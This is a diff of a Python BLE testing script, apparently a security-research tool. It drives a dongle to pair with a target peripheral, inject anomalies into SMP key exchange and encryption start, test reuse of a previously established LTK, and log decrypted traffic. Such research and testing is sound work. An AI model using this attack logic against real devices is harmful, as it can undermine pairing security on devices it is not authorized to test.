@@ -43,8 +43,8 @@ print(Fore.YELLOW + 'Using IOCap: ' + hex(pairing_iocap) + ', Auth REQ: ' + hex(
 # Internal vars
 script_folder = os.path.dirname(os.path.realpath(__file__))
 SCAN_TIMEOUT = 3
-KEY_EXCHANGE_TIMEOUT = 1
-CRASH_TIMEOUT = 6
+KEY_EXCHANGE_TIMEOUT = 2
+CRASH_TIMEOUT = 7
 none_count = 0
 end_connection = False
 connecting = False
@@ -62,6 +62,8 @@ fragment_left = False
 slave_txaddr = 0  # use public address by default
 slave_ever_connected = False
 disable_smp = False
+smp_packet_on_hold = None
+driver = None
 
 # Script variables
 run_script = True
@@ -75,6 +77,7 @@ enable_secure_connections = False
 anomalies = [[], []]
 last_smp_summary = None
 final_test = False
+current_conn_skd = None
 
 addr_type = {
     0: 'Public',
@@ -115,15 +118,17 @@ def crash_timeout():
 
 
 def scan_timeout():
-    global run_script, switch_pairing, connecting, encryption_enabled, enc_start_index, version_received, end_connection
+    global driver, run_script, switch_pairing, connecting, encryption_enabled, enc_start_index, version_received, end_connection
     end_connection = False
     encryption_enabled = False
+    driver.logs_pcap = True
     version_received = False
 
     if switch_pairing and not enable_secure_connections:
         change_pairing()
 
     if not final_test:
+        print(Fore.YELLOW + '[!] Timeout')
         scan_req = BTLE() / BTLE_ADV(RxAdd=slave_txaddr) / BTLE_SCAN_REQ(
             ScanA=master_address,
             AdvA=advertiser_address)
@@ -199,7 +204,6 @@ def defragment_l2cap(pkt):
 
 def send_encrypted(pkt):
     global conn_tx_packet_counter
-
     raw_pkt = bytearray(raw(pkt))
     aa = raw_pkt[:4]
     header = raw_pkt[4]  # Get ble header
@@ -216,6 +220,7 @@ def send_encrypted(pkt):
     enc_pkt, mic = aes.encrypt_and_digest(raw_pkt[6:-3])  # get payload and exclude 3 bytes of crc
     conn_tx_packet_counter += 1  # Increment packet counter
     driver.raw_send(aa + chr(header) + chr(length) + enc_pkt + mic + crc)
+    driver.packets_buffer.append(NORDIC_BLE(board=75, protocol=2, flags=0x3) / pkt)  # Save pkt before encryption
     print(Fore.CYAN + "TX ---> [Encrypted]{" + pkt.summary()[7:] + '}')
 
 
@@ -293,6 +298,10 @@ while run_script:
 
         pkt = defragment_l2cap(pkt)
 
+        if encryption_enabled and pkt:
+            # Manually save packets here
+            driver.packets_buffer.append(NORDIC_BLE(board=75, protocol=2, flags=0x01) / pkt)
+
         # if packet is incorrectly decoded, you may not be using the dongle
         if pkt is None:
             none_count += 1
@@ -324,6 +333,7 @@ while run_script:
             conn_rx_packet_counter = 0
             conn_tx_packet_counter = 0
             encryption_enabled = False
+            NRF52Dongle.logs_pcap = True
             slave_txaddr = pkt.TxAdd
             print(Fore.GREEN + advertiser_address.upper() + ': ' + pkt.summary()[7:] + ' Detected')
             print(Fore.GREEN + 'Slave address type: ' + addr_type[slave_txaddr])
@@ -372,6 +382,7 @@ while run_script:
             set_security_settings(pkt)
 
         elif LL_FEATURE_RSP in pkt:
+            print(Fore.GREEN + 'Slave Features: ' + str(pkt.feature_set))
             if not version_received:
                 pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_VERSION_IND(version='4.2')
                 driver.send(pkt)
@@ -412,9 +423,20 @@ while run_script:
                 else:
                     print(Fore.GREEN + "Legacy Pairing")
 
-            if enable_anomaly:
+            if not encryption_enabled and enable_anomaly:
                 if enc_start_index >= enc_start_index_max:
-                    disable_smp = True
+
+                    # Store SMP packet to be sent after encryption (if successful)
+                    smp_answer = BLESMPServer.send_hci(raw(HCI_Hdr() / HCI_ACL_Hdr() / L2CAP_Hdr() / pkt[SM_Hdr]))
+                    if smp_answer is not None and isinstance(smp_answer, list):
+                        for res in smp_answer:
+                            res = HCI_Hdr(res)  # type: HCI_Hdr
+                            if SM_Hdr in res:
+                                smp_packet_on_hold = BTLE(access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / res[
+                                    SM_Hdr]
+                                print(Fore.YELLOW + 'Holding TX ---> ' + smp_packet_on_hold.summary())
+
+                    disable_smp = False
                     enc_start_index_max += 1
                     enc_start_index = 0
                     conn_ltk = first_ltk
@@ -425,6 +447,7 @@ while run_script:
                                                                                            rand='\x00',
                                                                                            skdm=conn_iv,
                                                                                            ivm=conn_skd)
+
                     driver.send(enc_request)
 
                     last_smp_summary = pkt.summary()
@@ -447,14 +470,16 @@ while run_script:
                         res = HCI_Hdr(res)  # type: HCI_Hdr
                         if SM_Hdr in res:
                             pkt = BTLE(access_addr=access_address) / BTLE_DATA() / L2CAP_Hdr() / res[SM_Hdr]
+
                             if encryption_enabled:
                                 send_encrypted(pkt)
                             else:
                                 driver.send(pkt)
 
                         elif HCI_Cmd_LE_Start_Encryption_Request in res:
-                            conn_ltk = res.ltk
                             print(Fore.GREEN + "[!] STK/LTK received from SMP server: " + hexlify(res.ltk).upper())
+
+                            conn_ltk = res.ltk
                             conn_iv = b'\x00' * 4  # set IVm (IV of master)
                             conn_skd = b'\x00' * 8  # set SKDm (session key diversifier part of master)
 
@@ -463,7 +488,13 @@ while run_script:
                                                                                                    rand=b'\x00',
                                                                                                    skdm=conn_iv,
                                                                                                    ivm=conn_skd)
-                            driver.send(enc_request)
+                            if encryption_enabled:
+                                # Send pause encryption request
+                                pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_PAUSE_ENC_REQ()
+                                send_encrypted(pkt)
+                            else:
+                                driver.send(enc_request)
+                            # driver.send(enc_request)
 
         elif LL_ENC_RSP in pkt:
             # Get IVs and SKDs from slave encryption response
@@ -471,6 +502,7 @@ while run_script:
             conn_iv += pkt[LL_ENC_RSP].ivs  # IV = IVm || IVs
             conn_session_key = bt_crypto_e(conn_ltk[::-1], conn_skd[::-1])
             conn_packet_counter = 0
+            current_conn_skd = conn_skd
 
             if enable_anomaly is False:
                 print(Fore.GREEN + 'Received SKD: ' + hexlify(conn_skd))
@@ -493,6 +525,7 @@ while run_script:
                         Fore.RED + 'This means that the peripheral is using some unknown LTK here (informed by its SMP)')
                 print(Fore.YELLOW + '[!] Trying to send encrypted message with LTK=' + hexlify(conn_ltk))
             encryption_enabled = True
+            driver.logs_pcap = False
             pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_START_ENC_RSP()
             send_encrypted(pkt)
 
@@ -503,8 +536,12 @@ while run_script:
                 start_timeout('key_exchange_timeout', KEY_EXCHANGE_TIMEOUT, key_exchange_timeout)
             else:
                 # end connection and notify with a warning
-                print(Fore.RED + 'The peripheral is using the previous established LTK')
-                end_connection = True
+                print(Fore.YELLOW + '[!] The peripheral is using the previous established LTK')
+                send_encrypted(smp_packet_on_hold)
+                end_connection = False
+                # pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_REQ(
+                #     max_tx_bytes=247 + 4, max_rx_bytes=247 + 4)
+                # send_encrypted(pkt)
 
         elif LL_REJECT_IND in pkt or SM_Failed in pkt:
             print(Fore.YELLOW + 'Peripheral is rejecting pairing')
@@ -525,6 +562,7 @@ while run_script:
         if end_connection:
             end_connection = False
             encryption_enabled = False
+            driver.logs_pcap = True
             enc_start_index = 0
             version_received = False
 
